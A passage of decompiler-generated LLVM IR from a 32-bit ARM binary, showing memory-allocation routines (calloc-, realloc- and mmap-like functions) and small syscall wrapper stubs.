  uselistorder i32 ptrtoint (i32* @global_var_19fd2.578 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_2240c.564, { 1, 5, 6, 7, 0, 2, 8, 9, 3, 10, 4, 12, 11 }
  uselistorder i32* @global_var_22408.562, { 3, 7, 8, 9, 0, 4, 2, 1, 10, 5, 11, 6, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_22408.562 to i32), { 23, 24, 25, 10, 3, 26, 27, 4, 28, 18, 12, 29, 20, 30, 31, 32, 2, 33, 21, 34, 11, 35, 13, 22, 36, 5, 37, 38, 39, 0, 14, 6, 40, 15, 7, 41, 42, 43, 1, 16, 19, 8, 44, 17, 9, 45 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_14234, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14148, { 1, 0 }
  uselistorder label %dec_label_pc_14138, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_14130, { 1, 0 }
  uselistorder label %dec_label_pc_13fa0, { 1, 0 }
  uselistorder label %dec_label_pc_13f70, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13f6c, { 1, 0 }
  uselistorder label %dec_label_pc_13f54, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_13f10, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13ec8, { 1, 0 }
  uselistorder label %dec_label_pc_13e74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13df8, { 1, 0 }
  uselistorder label %dec_label_pc_13d48, { 1, 0 }
  uselistorder label %dec_label_pc_13d48.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13d2c.loopexit, { 2, 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_13cf8, { 2, 0, 1 }
}

define i32 @function_143c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_143c0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_143c8 = call i32 @function_13cc8()
  %v2_143cc = icmp eq i32 %v0_143c8, 0
  br i1 %v2_143cc, label %dec_label_pc_1440c, label %dec_label_pc_143d4

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143c0
  %v1_143d4 = add i32 %v0_143c8, -4
  %v2_143d4 = inttoptr i32 %v1_143d4 to i32*
  %v3_143d4 = load i32, i32* %v2_143d4, align 4
  %v1_143d8 = urem i32 %v3_143d4, 2
  %v2_143d8 = icmp eq i32 %v1_143d8, 0
  br i1 %v2_143d8, label %dec_label_pc_1440c, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143d4
  %v0_143e0 = load i32, i32* @r4, align 4
  %v1_143e0 = add i32 %v0_143e0, 3
  %v3_143e4 = udiv i32 %v1_143e0, 4
  store i32 %v3_143e4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v1_143e0, 4
  br i1 %tmp, label %dec_label_pc_1440c, label %dec_label_pc_143ec

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143e0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %.thread, %dec_label_pc_143ec
  %v0_144002 = phi i32 [ %v1_14400, %.thread ], [ %v3_143e4, %dec_label_pc_143ec ]
  %v2_143fc = phi i32 [ %v1_14404, %.thread ], [ 0, %dec_label_pc_143ec ]
  %v2_143f0 = add i32 %v2_143fc, %v0_143c8
  %v3_143f0 = inttoptr i32 %v2_143f0 to i32*
  %v4_143f0 = load i32, i32* %v3_143f0, align 4
  %v2_143f4 = icmp eq i32 %v4_143f0, 0
  br i1 %v2_143f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_143f0
  store i32 0, i32* %v3_143f0, align 4
  %v0_14400.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_14404.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_143f0, %bb
  %v0_14404 = phi i32 [ %v2_143fc, %dec_label_pc_143f0 ], [ %v0_14404.pre, %bb ]
  %v0_14400 = phi i32 [ %v0_144002, %dec_label_pc_143f0 ], [ %v0_14400.pre, %bb ]
  %v1_14400 = add i32 %v0_14400, -1
  store i32 %v1_14400, i32* %r2.global-to-local, align 4
  %v7_14400 = icmp eq i32 %v0_14400, 1
  %v1_14404 = add i32 %v0_14404, 4
  store i32 %v1_14404, i32* %r1.global-to-local, align 4
  br i1 %v7_14400, label %dec_label_pc_1440c.loopexit, label %dec_label_pc_143f0

dec_label_pc_1440c.loopexit:                      ; preds = %.thread
  br label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %dec_label_pc_1440c.loopexit, %dec_label_pc_143e0, %dec_label_pc_143d4, %dec_label_pc_143c0
  ret i32 %v0_143c8

; uselistorder directives
  uselistorder i32 %v1_14404, { 1, 0 }
  uselistorder i32 %v1_14400, { 1, 0 }
  uselistorder i32 %v2_143fc, { 1, 0 }
  uselistorder i32 %v3_143e4, { 1, 0 }
  uselistorder i32 %v0_143c8, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14414(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14414:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_14414 = load i32, i32* @r4, align 4
  store i32 %v3_14414, i32* %stack_var_-32, align 4
  %v6_14414 = load i32, i32* @r5, align 4
  %v9_14414 = load i32, i32* @r6, align 4
  %v12_14414 = load i32, i32* @r7, align 4
  %v15_14414 = load i32, i32* @r8, align 4
  %v18_14414 = load i32, i32* @sb, align 4
  %v21_14414 = load i32, i32* @sl, align 4
  %v24_14414 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_14418 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @r0, align 4
  br i1 %v2_14418, label %dec_label_pc_145b0, label %dec_label_pc_14424

dec_label_pc_14424:                               ; preds = %dec_label_pc_14414
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v1_1442c = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_1442c, 2147479536
  br i1 %tmp, label %.thread, label %dec_label_pc_14440

.thread:                                          ; preds = %dec_label_pc_14424
  %v5_14434 = add i32 %arg2, 23
  store i32 %v5_14434, i32* %r3.global-to-local, align 4
  %v5_14438 = and i32 %v5_14434, -16
  br label %dec_label_pc_1444c

dec_label_pc_14440:                               ; preds = %dec_label_pc_14424
  %v2_14440 = icmp eq i32 %arg2, 0
  br i1 %v2_14440, label %dec_label_pc_1444c, label %dec_label_pc_145dc

dec_label_pc_1444c:                               ; preds = %dec_label_pc_14440, %.thread
  %v0_14544 = phi i32 [ %v5_14438, %.thread ], [ 16, %dec_label_pc_14440 ]
  store i32 %v0_14544, i32* @r5, align 4
  %v1_1444c = add i32 %arg1, -8
  store i32 %v1_1444c, i32* @r4, align 4
  %v1_14450 = add i32 %arg1, -4
  %v2_14450 = inttoptr i32 %v1_14450 to i32*
  %v3_14450 = load i32, i32* %v2_14450, align 4
  %v1_14454 = urem i32 %v3_14450, 2
  store i32 %v1_14454, i32* %r3.global-to-local, align 4
  %v2_14454 = icmp eq i32 %v1_14454, 0
  %v1_14458 = and i32 %v3_14450, -2
  store i32 %v1_14458, i32* @r6, align 4
  br i1 %v2_14454, label %dec_label_pc_14460, label %dec_label_pc_144d0

dec_label_pc_14460:                               ; preds = %dec_label_pc_1444c
  %v2_14460 = inttoptr i32 %v1_1444c to i32*
  %v3_14460 = load i32, i32* %v2_14460, align 4
  store i32 %v3_14460, i32* @r7, align 4
  %v1_14464 = urem i32 %v3_14460, 2
  %v2_14464 = icmp eq i32 %v1_14464, 0
  %v2_14468 = add i32 %v3_14460, %v0_14544
  store i32 %v2_14468, i32* @r8, align 4
  br i1 %v2_14464, label %bb34, label %bb33

bb33:                                             ; preds = %dec_label_pc_14460
  call void @llvm.trap()
  unreachable

bb34:                                             ; preds = %dec_label_pc_14460
  %v3_14474 = icmp ult i32 %v2_14468, 4094
  br i1 %v3_14474, label %dec_label_pc_14544, label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14544.dec_label_pc_14478_crit_edge, %bb34
  %v1_14484 = phi i32 [ %v1_14484.pre, %dec_label_pc_14544.dec_label_pc_14478_crit_edge ], [ %v3_14460, %bb34 ]
  %v0_14484 = phi i32 [ %v0_14484.pre, %dec_label_pc_14544.dec_label_pc_14478_crit_edge ], [ %v1_14458, %bb34 ]
  %v0_14478 = phi i32 [ %v0_14478.pre, %dec_label_pc_14544.dec_label_pc_14478_crit_edge ], [ %v2_14468, %bb34 ]
  %v1_1447c = add i32 %v0_14478, 4095
  store i32 %v1_1447c, i32* %r3.global-to-local, align 4
  %v2_14484 = add i32 %v1_14484, %v0_14484
  store i32 %v2_14484, i32* %r6.global-to-local, align 4
  %v1_14488 = and i32 %v1_1447c, -4096
  store i32 %v1_14488, i32* %r5.global-to-local, align 4
  %v9_1448c = icmp eq i32 %v2_14484, %v1_14488
  br i1 %v9_1448c, label %bb37, label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14478
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v1_14488, i32* @r2, align 4
  %v1_1449c = load i32, i32* @r4, align 4
  %v2_1449c = sub i32 %v1_1449c, %v1_14484
  store i32 %v2_1449c, i32* @r0, align 4
  store i32 %v2_14484, i32* %r1.global-to-local, align 4
  %v4_144a4 = call i32 @function_14704(i32 %v2_1449c, i32 %v2_14484, i32 %v1_14488, i32 1)
  store i32 %v4_144a4, i32* %r0.global-to-local, align 4
  %v3_144a8 = icmp eq i32 %v4_144a4, -1
  %v8_144a8 = icmp eq i32 %v4_144a4, -1
  br i1 %v8_144a8, label %.thread3, label %bb35

bb35:                                             ; preds = %dec_label_pc_14494
  %v1_144ac = load i32, i32* @r7, align 4
  %v3_144ac = add i32 %v1_144ac, %v4_144a4
  store i32 %v3_144ac, i32* %r3.global-to-local, align 4
  %v2_144b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_144b0 = sub i32 %v2_144b0, %v1_144ac
  %v2_144b4 = add i32 %v3_144ac, 8
  store i32 %v2_144b4, i32* @sb, align 4
  %v3_144b8 = add i32 %v3_144ac, 4
  %v4_144b8 = inttoptr i32 %v3_144b8 to i32*
  store i32 %v3_144b0, i32* %v4_144b8, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14494, %bb35
  br i1 %v3_144a8, label %dec_label_pc_144c0, label %dec_label_pc_1450c

dec_label_pc_144c0:                               ; preds = %.thread3
  %v0_144c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_144c0 = load i32, i32* %r5.global-to-local, align 4
  %tmp41 = icmp ugt i32 %v0_144c0, %v1_144c0
  br i1 %tmp41, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_144c0
  store i32 0, i32* @sl, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_144c0, %dec_label_pc_14478, %bb36
  %v0_144c8 = load i32, i32* @sl, align 4
  store i32 %v0_144c8, i32* @sb, align 4
  br label %dec_label_pc_1450c

dec_label_pc_144d0:                               ; preds = %dec_label_pc_1444c
  %v2_144d0 = add i32 %v1_14458, %v1_1444c
  %v3_144d0 = inttoptr i32 %v2_144d0 to i32*
  %v4_144d0 = load i32, i32* %v3_144d0, align 4
  store i32 %v4_144d0, i32* %r3.global-to-local, align 4
  %v9_144d4 = icmp eq i32 %v3_14450, %v4_144d0
  br i1 %v9_144d4, label %.thread4, label %bb38

bb38:                                             ; preds = %dec_label_pc_144d0
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_144d0
  %v3_144e0 = icmp ult i32 %v1_14458, %v0_14544
  br i1 %v3_144e0, label %dec_label_pc_1456c, label %.thread9

.thread9:                                         ; preds = %.thread4
  %v2_144e4 = or i32 %v3_14450, 1
  store i32 %v2_144e4, i32* %r3.global-to-local, align 4
  store i32 %v2_144d0, i32* @r7, align 4
  store i32 %v2_144e4, i32* %v3_144d0, align 4
  %v1_144f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_144f0 = load i32, i32* @r4, align 4
  %v3_144f0 = add i32 %v2_144f0, 4
  %v4_144f0 = inttoptr i32 %v3_144f0 to i32*
  store i32 %v1_144f0, i32* %v4_144f0, align 4
  br label %dec_label_pc_144f8

dec_label_pc_144f8:                               ; preds = %dec_label_pc_145b8, %.thread9
  %v0_144f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144f8 = and i32 %v0_144f8, -2
  store i32 %v1_144f8, i32* %r1.global-to-local, align 4
  %v1_144fc = add i32 %v1_144f8, -16
  %v1_14500 = load i32, i32* @r5, align 4
  %tmp42 = icmp ugt i32 %v1_144fc, %v1_14500
  br i1 %tmp42, label %dec_label_pc_14518, label %dec_label_pc_14508

dec_label_pc_14508:                               ; preds = %dec_label_pc_144f8, %dec_label_pc_14518
  %v0_14508 = load i32, i32* @r4, align 4
  %v1_14508 = add i32 %v0_14508, 8
  store i32 %v1_14508, i32* @sb, align 4
  br label %dec_label_pc_1450c

dec_label_pc_1450c:                               ; preds = %.thread3, %dec_label_pc_14588, %dec_label_pc_14598, %dec_label_pc_14554, %bb37, %dec_label_pc_145dc, %dec_label_pc_14508
  %v0_1450c = load i32, i32* @sb, align 4
  store i32 %v0_1450c, i32* %r0.global-to-local, align 4
  %v2_14510 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14510, i32* @r4, align 4
  store i32 %v6_14414, i32* @r5, align 4
  store i32 %v9_14414, i32* @r6, align 4
  store i32 %v12_14414, i32* @r7, align 4
  store i32 %v15_14414, i32* @r8, align 4
  store i32 %v18_14414, i32* @sb, align 4
  store i32 %v21_14414, i32* @sl, align 4
  store i32 %v24_14414, i32* @lr, align 4
  ret i32 %v0_1450c

dec_label_pc_14518:                               ; preds = %dec_label_pc_144f8
  %v2_14518 = sub i32 %v1_144f8, %v1_14500
  %v1_1451c = or i32 %v2_14518, 1
  store i32 %v1_1451c, i32* %r3.global-to-local, align 4
  %v0_14520 = load i32, i32* @r4, align 4
  %v2_14520 = add i32 %v0_14520, %v1_14500
  store i32 %v2_14520, i32* %r0.global-to-local, align 4
  %v1_14524 = or i32 %v1_14500, 1
  store i32 %v1_14524, i32* @r2, align 4
  %v2_14528 = add i32 %v2_14520, 4
  %v3_14528 = inttoptr i32 %v2_14528 to i32*
  store i32 %v1_1451c, i32* %v3_14528, align 4
  %v0_1452c = load i32, i32* @r2, align 4
  %v1_1452c = load i32, i32* @r4, align 4
  %v2_1452c = load i32, i32* @r5, align 4
  %v3_1452c = add i32 %v2_1452c, %v1_1452c
  %v4_1452c = inttoptr i32 %v3_1452c to i32*
  store i32 %v0_1452c, i32* %v4_1452c, align 4
  %v0_14530 = load i32, i32* @r2, align 4
  %v1_14530 = load i32, i32* @r4, align 4
  %v2_14530 = add i32 %v1_14530, 4
  %v3_14530 = inttoptr i32 %v2_14530 to i32*
  store i32 %v0_14530, i32* %v3_14530, align 4
  %v0_14534 = load i32, i32* %r3.global-to-local, align 4
  %v1_14534 = load i32, i32* @r4, align 4
  %v2_14534 = load i32, i32* %r1.global-to-local, align 4
  %v3_14534 = add i32 %v2_14534, %v1_14534
  %v4_14534 = inttoptr i32 %v3_14534 to i32*
  store i32 %v0_14534, i32* %v4_14534, align 4
  %v0_14538 = load i32, i32* %r0.global-to-local, align 4
  %v1_14538 = add i32 %v0_14538, 8
  store i32 %v1_14538, i32* %r0.global-to-local, align 4
  %v1_1453c = call i32 @function_137cc(i32 %v1_14538)
  store i32 %v1_1453c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14508

dec_label_pc_14544:                               ; preds = %bb34
  store i32 %v0_14544, i32* @r0, align 4
  %v0_14548 = call i32 @function_13cc8()
  store i32 %v0_14548, i32* %r0.global-to-local, align 4
  store i32 %v0_14548, i32* @sb, align 4
  %v2_1454c = icmp eq i32 %v0_14548, 0
  br i1 %v2_1454c, label %dec_label_pc_14544.dec_label_pc_14478_crit_edge, label %dec_label_pc_14554

dec_label_pc_14544.dec_label_pc_14478_crit_edge:  ; preds = %dec_label_pc_14544
  %v0_14478.pre = load i32, i32* @r8, align 4
  %v0_14484.pre = load i32, i32* @r6, align 4
  %v1_14484.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14478

dec_label_pc_14554:                               ; preds = %dec_label_pc_14544
  %v0_14554 = load i32, i32* @r5, align 4
  %v1_14554 = add i32 %v0_14554, -8
  %v0_14558 = load i32, i32* @sl, align 4
  store i32 %v0_14558, i32* %r1.global-to-local, align 4
  %v3_1455c = inttoptr i32 %v0_14548 to i16*
  %v4_1455c = call i32 @function_1513c(i16* %v3_1455c, i32 %v0_14558, i32 %v1_14554)
  %v0_14560 = load i32, i32* @sl, align 4
  store i32 %v0_14560, i32* %r0.global-to-local, align 4
  %v1_14564 = call i32 @function_137cc(i32 %v0_14560)
  store i32 %v1_14564, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1450c

dec_label_pc_1456c:                               ; preds = %.thread4
  store i32 %v2_144d0, i32* @r7, align 4
  store i32 %v2_144d0, i32* %r0.global-to-local, align 4
  %v1_14570 = call i32 @function_1353c(i32 %v2_144d0)
  store i32 %v1_14570, i32* %r0.global-to-local, align 4
  %v2_14574 = icmp eq i32 %v1_14570, 0
  br i1 %v2_14574, label %.thread12, label %dec_label_pc_145b8

.thread12:                                        ; preds = %dec_label_pc_1456c
  %v1_14578 = load i32, i32* @r6, align 4
  %v2_14578 = or i32 %v1_14578, 1
  store i32 %v2_14578, i32* %r3.global-to-local, align 4
  %v2_1457c = load i32, i32* @r4, align 4
  %v4_1457c = add i32 %v2_1457c, %v1_14578
  %v5_1457c = inttoptr i32 %v4_1457c to i32*
  store i32 %v2_14578, i32* %v5_1457c, align 4
  %v1_14580 = load i32, i32* %r3.global-to-local, align 4
  %v2_14580 = load i32, i32* @r4, align 4
  %v3_14580 = add i32 %v2_14580, 4
  %v4_14580 = inttoptr i32 %v3_14580 to i32*
  store i32 %v1_14580, i32* %v4_14580, align 4
  br label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %dec_label_pc_145b8, %.thread12
  %v0_14588 = load i32, i32* @r5, align 4
  %v1_14588 = add i32 %v0_14588, -8
  store i32 %v1_14588, i32* @r0, align 4
  %v0_1458c = call i32 @function_13cc8()
  store i32 %v0_1458c, i32* %r0.global-to-local, align 4
  store i32 %v0_1458c, i32* @sb, align 4
  %v2_14590 = icmp eq i32 %v0_1458c, 0
  br i1 %v2_14590, label %dec_label_pc_1450c, label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %dec_label_pc_14588
  %v0_14598 = load i32, i32* @sl, align 4
  store i32 %v0_14598, i32* %r1.global-to-local, align 4
  %v0_1459c = load i32, i32* @r6, align 4
  %v1_1459c = add i32 %v0_1459c, -8
  %v3_145a0 = inttoptr i32 %v0_1458c to i16*
  %v4_145a0 = call i32 @function_1513c(i16* %v3_145a0, i32 %v0_14598, i32 %v1_1459c)
  %v0_145a4 = load i32, i32* @r4, align 4
  %v1_145a4 = add i32 %v0_145a4, 8
  store i32 %v1_145a4, i32* %r0.global-to-local, align 4
  %v1_145a8 = call i32 @function_137cc(i32 %v1_145a4)
  store i32 %v1_145a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1450c

dec_label_pc_145b0:                               ; preds = %dec_label_pc_14414
  store i32 %v21_14414, i32* @sl, align 4
  %v0_145b4 = call i32 @function_13cc8()
  store i32 %v0_145b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145b8

dec_label_pc_145b8:                               ; preds = %dec_label_pc_1456c, %dec_label_pc_145b0
  %v0_145b8 = load i32, i32* @r7, align 4
  %v1_145b8 = add i32 %v0_145b8, 4
  %v2_145b8 = inttoptr i32 %v1_145b8 to i32*
  %v3_145b8 = load i32, i32* %v2_145b8, align 4
  %v1_145bc = and i32 %v3_145b8, -2
  %v1_145c0 = load i32, i32* @r6, align 4
  %v2_145c0 = add i32 %v1_145c0, %v1_145bc
  %v1_145c4 = load i32, i32* @r5, align 4
  %v3_145c4 = icmp ult i32 %v2_145c0, %v1_145c4
  %v1_145c8 = or i32 %v2_145c0, 1
  store i32 %v1_145c8, i32* %r3.global-to-local, align 4
  %v3_145cc = add i32 %v1_145bc, %v0_145b8
  %v4_145cc = inttoptr i32 %v3_145cc to i32*
  store i32 %v1_145c8, i32* %v4_145cc, align 4
  %v0_145d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_145d0 = load i32, i32* @r4, align 4
  %v2_145d0 = add i32 %v1_145d0, 4
  %v3_145d0 = inttoptr i32 %v2_145d0 to i32*
  store i32 %v0_145d0, i32* %v3_145d0, align 4
  br i1 %v3_145c4, label %dec_label_pc_14588, label %dec_label_pc_144f8

dec_label_pc_145dc:                               ; preds = %dec_label_pc_14440
  %v0_145dc = call i32 @function_12f18()
  store i32 %v0_145dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_145e8 = inttoptr i32 %v0_145dc to i32*
  store i32 12, i32* %v2_145e8, align 4
  br label %dec_label_pc_1450c

; uselistorder directives
  uselistorder i32 %v1_14500, { 2, 1, 3, 0 }
  uselistorder i32 %v2_144d0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_144ac, { 1, 0 }
  uselistorder i32 %v4_144a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14484, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14468, { 1, 0, 2 }
  uselistorder i32 %v3_14460, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14458, { 2, 1, 0, 3 }
  uselistorder i32 %v1_14454, { 1, 0 }
  uselistorder i32 %v3_14450, { 1, 2, 3, 0 }
  uselistorder i32 %v0_14544, { 0, 2, 1, 3 }
  uselistorder i32 %v21_14414, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 14, 16, 17, 0, 1, 2, 3, 15, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 16, 15, 3, 2, 4, 6, 5, 7, 8, 9, 14, 10, 11, 12, 13, 1, 0 }
  uselistorder i32 (i32)* @function_1353c, { 1, 0 }
  uselistorder i32 ()* @function_13cc8, { 57, 5, 4, 0, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 3, 6 }
  uselistorder i32 (i32)* @function_137cc, { 4, 3, 2, 0, 5, 7, 6, 1 }
  uselistorder i32 4095, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_145b8, { 1, 0 }
  uselistorder label %dec_label_pc_1450c, { 5, 2, 1, 3, 6, 4, 0 }
  uselistorder label %dec_label_pc_14508, { 1, 0 }
  uselistorder label %bb37, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_145f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_145f0:
  store i32 %arg2, i32* @r2, align 4
  %v0_14614 = call i32 @function_131c4()
  ret i32 %v0_14614
}

define i32 @function_14628(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14628:
  %v0_14634 = call i32 @function_131c4()
  ret i32 %v0_14634
}

define i32 @function_14640() local_unnamed_addr {
dec_label_pc_14640:
  %v1_14640 = load i32, i32* @r0, align 4
  ret i32 %v1_14640
}

define i32 @function_14644(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14644:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v2_1465c = urem i32 %arg6, 4096
  %v2_14660 = and i32 %arg7, -4096
  %v2_14664 = or i32 %v2_14660, %v2_1465c
  %v4_14664 = icmp eq i32 %v2_14664, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg3, i32* %fp.global-to-local, align 4
  %v0_14674 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14674, i32* %sl.global-to-local, align 4
  br i1 %v4_14664, label %dec_label_pc_1468c, label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %dec_label_pc_14644
  %v0_1467c = call i32 @function_12f18()
  br label %dec_label_pc_146a0

dec_label_pc_1468c:                               ; preds = %dec_label_pc_14644
  %tmp = icmp ult i32 %arg2, 2147483647
  br i1 %tmp, label %dec_label_pc_146a8, label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %dec_label_pc_1468c
  %v0_14694 = call i32 @function_12f18()
  br label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_1467c, %dec_label_pc_14694
  %storemerge1 = phi i32 [ %v0_1467c, %dec_label_pc_1467c ], [ %v0_14694, %dec_label_pc_14694 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_1467c ], [ 12, %dec_label_pc_14694 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %storemerge, i32* @r3, align 4
  %v2_146a0 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_146a0, align 4
  %v0_146e8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_146e8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_1468c
  %v1_146a8 = and i32 %v0_14674, 16
  %v2_146a8 = icmp eq i32 %v1_146a8, 0
  br i1 %v2_146a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_146a8
  store i32 83520, i32* %r3.global-to-local, align 4
  store i32 83640, i32* @lr, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_146a8, %bb
  %v2_146b4 = xor i1 %v2_146a8, true
  call void @__pseudo_cond_branch(i1 %v2_146b4, i32 ptrtoint (i32* @global_var_14640.588 to i32))
  %v0_146c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_146c8, i32* @r0, align 4
  %v0_146cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_146cc, i32* @r2, align 4
  %v0_146d0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_146d0, i32* @r3, align 4
  %v3_146d4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_146d4, i32* @r4, align 4
  %v0_146e0 = call i32 @function_131c4()
  store i32 %v0_146e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_146e8

dec_label_pc_146e8:                               ; preds = %dec_label_pc_146a0, %.thread
  %v0_146e8 = phi i32 [ %v0_146e8.pre, %dec_label_pc_146a0 ], [ %v0_146e0, %.thread ]
  ret i32 %v0_146e8

; uselistorder directives
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32 -4096, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_146e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_146a0, { 1, 0 }
}

define i32 @function_14704(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14704:
  store i32 %arg2, i32* @r4, align 4
  %v0_14728 = call i32 @function_131c4()
  ret i32 %v0_14728
}

define i32 @function_14740(i32 %arg1) local_unnamed_addr {
dec_label_pc_14740:
  store i32 %arg1, i32* @r0, align 4
  store i32 83520, i32* @r3, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 83804, i32* @lr, align 4
  %v1_14758 = call i32 @function_14640()
  %v0_1475c = load i32, i32* @r4, align 4
  store i32 %v0_1475c, i32* @r0, align 4
  %v0_14768 = call i32 @function_131c4()
  ret i32 %v0_14768
}

define i32 @function_14778(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14778:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_147a4 = call i32 @function_157a0(i32 285, i32 %arg1, i32 %arg2)
  store i32 %v3_147a4, i32* @r0, align 4
  %v0_147a8 = call i32 @function_131c4()
  ret i32 %v0_147a8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

